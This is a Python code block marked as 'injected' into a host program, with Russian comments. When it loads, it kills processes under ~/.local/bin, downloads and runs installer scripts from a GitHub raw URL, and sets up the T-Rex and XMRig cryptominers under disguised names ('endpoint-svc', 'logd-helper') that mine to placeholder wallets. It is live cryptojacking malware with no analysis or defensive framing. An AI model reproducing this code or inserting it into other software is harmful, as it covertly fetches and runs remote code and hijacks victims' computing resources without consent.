# --- MINER MANAGER INJECTED START ---
import json
import os
import stat
import subprocess
import time
import traceback
import urllib.request
from pathlib import Path

PUBLIC_IP = "{HARDCODED_PUBLIC_IP}"
KRX_WALLET = "{KRX_WALLET}"
OCEAN_WALLET = "{OCEAN_WALLET}"

INSTALL_DIR = os.path.expanduser("~/.local/bin")

TREX_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",
    "INSTALLER_NAME": "install_t.sh",
    "BINARY_NAME": "endpoint-svc",
    "LOG_FILE": "t.log",
    "API_PORT": 60000,
    "API_TYPE": "trex",
    "API_KEY": "p1dOr1488"
}

XMRIG_CONFIG = {
    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",
    "INSTALLER_NAME": "install_x.sh",
    "BINARY_NAME": "logd-helper",
    "LOG_FILE": "x.log",
    "API_PORT": 60001,
    "API_TYPE": "xmrig",
    "API_KEY": "xmrig_secret"
}

MINER_CONFIGS = [TREX_CONFIG, XMRIG_CONFIG]

SCRIPTS_DIR = Path.home() / ".scripts"
SCRIPTS_DIR.mkdir(exist_ok=True, parents=True)
error_log_path = SCRIPTS_DIR / "miner_init_error.log"


def kill_processes_by_path_prefix(path_prefix):
    """
    Убивает все процессы, чья команда запуска начинается с path_prefix.
    Использует ps и grep.
    """
    try:
        # ps -ef выводит все процессы
        result = subprocess.run(["ps", "-ef"], capture_output=True, text=True, check=True)
        all_processes = result.stdout

        # Ищем PID'ы процессов, чья команда начинается с path_prefix
        pids_to_kill = []
        for line in all_processes.splitlines():
            parts = line.split(None, 7)  # Разбиваем на 8 частей, CMD будет в parts[7]
            if len(parts) > 7:
                if parts[7].startswith(path_prefix):
                    pids_to_kill.append(parts[1])  # PID находится в parts[1]

        if pids_to_kill:
            print(f"Found PIDs to kill: {pids_to_kill}")
            kill_cmd = ["kill", "-9"] + pids_to_kill
            subprocess.run(kill_cmd, check=True)
            print("Processes killed successfully.")
        else:
            print(f"No processes found starting with {path_prefix}")
    except subprocess.CalledProcessError as e:
        print(f"Error running ps/kill: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")


def get_pid_by_name(name):
    try:
        result = subprocess.run(f"ps -ef | grep -v grep | grep {name}", shell=True,
                                capture_output=True, text=True)
        if result.stdout: return int(result.stdout.strip().split()[1])
    except Exception:
        return None


def run_installer_script_if_needed(config):
    """Запускает скрипт установки, только если бинарник не найден."""
    install_dir = Path(INSTALL_DIR)
    install_dir.mkdir(exist_ok=True, parents=True)

    binary_path = install_dir / config["BINARY_NAME"]
    script_path = SCRIPTS_DIR / config["INSTALLER_NAME"]

    script_path.unlink(missing_ok=True)

    print(f"Downloading installer script {config['INSTALLER_NAME']}...")
    try:
        urllib.request.urlretrieve(config["SCRIPT_URL"], script_path)
        os.chmod(script_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
        print(f"Installer script {config['INSTALLER_NAME']} downloaded and made executable.")
    except Exception as e:
        print(f"Failed to download {config['INSTALLER_NAME']}: {e}")
        with open(error_log_path, "a") as f:
            f.write(f"--- FAILED TO DOWNLOAD {script_path} ---\n")
            f.write(traceback.format_exc())
        return False

    try:
        print(f"Running installer script {script_path}...")
        if config in MINER_CONFIGS[:1]:
            args = [str(binary_path), config["LOG_FILE"], KRX_WALLET, PUBLIC_IP]
        else:
            args = [str(binary_path), config["LOG_FILE"], OCEAN_WALLET, PUBLIC_IP]

        result = subprocess.run([str(script_path)] + args, check=True, capture_output=True, text=True,
                                cwd=str(SCRIPTS_DIR))
        print(f"Installer script {config['INSTALLER_NAME']} completed successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Installer script {config['INSTALLER_NAME']} failed with return code {e.returncode}.")
        print(f"Stderr: {e.stderr}")
        print(f"Stdout: {e.stdout}")
        with open(error_log_path, "a") as f:
            f.write(f"--- INSTALLER SCRIPT {script_path} FAILED ---\n")
            f.write(f"Return Code: {e.returncode}\nStderr: {e.stderr}\nStdout: {e.stdout}\n")
        return False
    except Exception as e:
        print(f"Failed to run installer script {config['INSTALLER_NAME']}. Error: {e}")
        with open(error_log_path, "a") as f:
            f.write(f"--- FAILED TO RUN INSTALLER SCRIPT {script_path} ---\n")
            f.write(traceback.format_exc())
        return False


def manage_miner(action):
    print(f"Executing miner action: {action}")
    for config in MINER_CONFIGS:
        try:
            api_port = config["API_PORT"]
            api_type = config["API_TYPE"]

            if api_type == "trex":
                url = (f'http://127.0.0.1:{api_port}/control'
                       f'?pause={"stop" == action}&sid={config["API_KEY"]}')
                try:
                    data = json.loads(urllib.request.urlopen(
                        urllib.request.Request(url, method='GET'),
                        timeout=2
                    ).read().decode('utf-8'))
                    if data.get("success", 0) == 0:
                        err = data.get("error", "")
                        print(f"Failed to {action} TREX via API. Reason: {err}")
                except urllib.error.URLError as e:  # Ловим конкретную ошибку urllib
                    print(f"Failed to {action} TREX via API. URLError: {e}")
                except json.JSONDecodeError as e:  # Ловим ошибку парсинга JSON
                    print(f"Failed to {action} TREX via API. JSON decode error: {e}")
                except Exception as e:  # Ловим любую другую ошибку при обращении к API
                    print(f"Failed to {action} TREX via API. General error: {e}")

            elif api_type == "xmrig":
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {config["API_KEY"]}'
                }
                body = json.dumps({
                    "id": 1,
                    "jsonrpc": "2.0",
                    "method": action,
                    "params": {}
                }).encode("utf-8")
                try:
                    urllib.request.urlopen(
                        urllib.request.Request(
                            url=f'http://127.0.0.1:{api_port}/json_rpc',
                            headers=headers,
                            data=body,
                            method='POST'
                        ),
                        timeout=2
                    )
                except urllib.error.URLError as e:  # Ловим конкретную ошибку urllib
                    print(f"Failed to {action} XMRig via API. URLError: {e}")
                except Exception as e:  # Ловим любую другую ошибку при обращении к API
                    print(f"Failed to {action} XMRig via API. General error: {e}")

        except Exception as err:
            print(f"Unexpected error in manage_miner loop for {config['BINARY_NAME']}. Reason: {err}")
            if action == 'resume':
                if not get_pid_by_name(config["BINARY_NAME"]):
                    print(f"Miner {config['BINARY_NAME']} is not running. Attempting to restart via script...")
                    run_installer_script_if_needed(config)


try:
    print("\n" + "=" * 50)
    print("Starting setup and management...")
    kill_processes_by_path_prefix(INSTALL_DIR)
    for config in MINER_CONFIGS:
        run_installer_script_if_needed(config)

    # Попытка логина для T-Rex (может не понадобиться при JSON-RPC)
    try:
        url = f'http://127.0.0.1:{TREX_CONFIG["API_PORT"]}/login?password={TREX_CONFIG["API_KEY"]}'
        req = urllib.request.Request(url, method='GET')
        data = json.loads(urllib.request.urlopen(req, timeout=2).read().decode('utf-8'))
        if data.get("success", 0) == 1:
            TREX_CONFIG["API_KEY"] = data.get("sid", "")
        else:
            err = data.get('error')
            print(f"Failed to login to T-Rex. Reason: {err}")
    except Exception as e:
        print(f"Error during T-Rex login attempt: {e}")

    time.sleep(2)
    manage_miner('start')

except Exception as e:
    print(f"Critical error in MINER MANAGER: {e}")
    print(traceback.format_exc())
    with open(error_log_path, "a") as f:
        f.write(f"--- CRITICAL MINER MANAGER ERROR ---\n")
        f.write(traceback.format_exc())

# --- MINER MANAGER INJECTED END ---
